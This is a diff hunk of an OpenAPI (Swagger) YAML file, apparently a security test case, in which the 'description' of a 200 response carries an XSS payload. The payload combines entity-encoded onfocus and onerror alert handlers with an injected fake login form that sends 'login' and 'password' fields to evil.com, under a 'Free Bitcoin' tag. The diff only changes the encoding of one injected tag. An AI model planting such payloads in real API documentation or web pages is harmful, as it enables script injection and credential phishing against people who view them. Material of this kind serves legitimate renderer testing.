@@ -8,7 +8,7 @@ paths:
     get:
       responses:
         '200':
-          description: No response was specified'"><h1%20&#x69;&#x64;&#x3d;&#x78;&#x20;&#x74;&#x61;&#x62;&#x69;&#x6e;&#x64;&#x65;&#x78;&#x3d;&#x31;&#x20;&#x6f;&#x6e;&#x66;&#x6f;&#x63;&#x75;&#x73;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;<p><form action="https://evil.com"  method="get"><label>&#x3c;&#x68;&#x31;&#x20;&#x69;&#x64;&#x3d;&#x78;&#x20;&#x74;&#x61;&#x62;&#x69;&#x6e;&#x64;&#x65;&#x78;&#x3d;&#x31;&#x20;&#x6f;&#x6e;&#x66;&#x6f;&#x63;&#x75;&#x73;&#x69;&#x6e;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;<p><input type="text" name="login"><p><input type="text" name="password"><p><input type="submit" value="Send"><p><h4><img src=x onerror=alert('Swagger-XSS')>
+          description: No response was specified'"><h1%20&#x69;&#x64;&#x3d;&#x78;&#x20;&#x74;&#x61;&#x62;&#x69;&#x6e;&#x64;&#x65;&#x78;&#x3d;&#x31;&#x20;&#x6f;&#x6e;&#x66;&#x6f;&#x63;&#x75;&#x73;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;<p><form action="https://evil.com"  method="get"><label><h1%20&#x69;&#x64;&#x3d;&#x78;&#x20;&#x74;&#x61;&#x62;&#x69;&#x6e;&#x64;&#x65;&#x78;&#x3d;&#x31;&#x20;&#x6f;&#x6e;&#x66;&#x6f;&#x63;&#x75;&#x73;&#x69;&#x6e;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;<p><input type="text" name="login"><p><input type="text" name="password"><p><input type="submit" value="Send"><p><h4><img src=x onerror=alert('Swagger-XSS')>
       tags:
         - Free Bitcoin
       operationId: findAccounts
